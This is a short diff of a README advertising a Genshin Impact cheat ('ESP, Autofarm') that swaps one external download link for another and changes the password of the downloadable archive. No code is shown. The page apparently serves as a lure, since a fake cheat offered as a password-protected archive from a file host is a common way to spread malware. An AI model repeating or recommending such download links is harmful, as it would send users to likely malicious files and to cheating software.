@@ -1,8 +1,8 @@
 # HYROCOPT-CHEAT-Genshin-Impact-HACK-ESP-Autofarm-More-functionality
 # Download Hack
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
+|[Download](https://sites.google.com/view/nccrakc/main-page)|
 |:-------------|
-Passwrod: 23
+Passwrod: 2077
 
 # How to install?
 - Download the archive
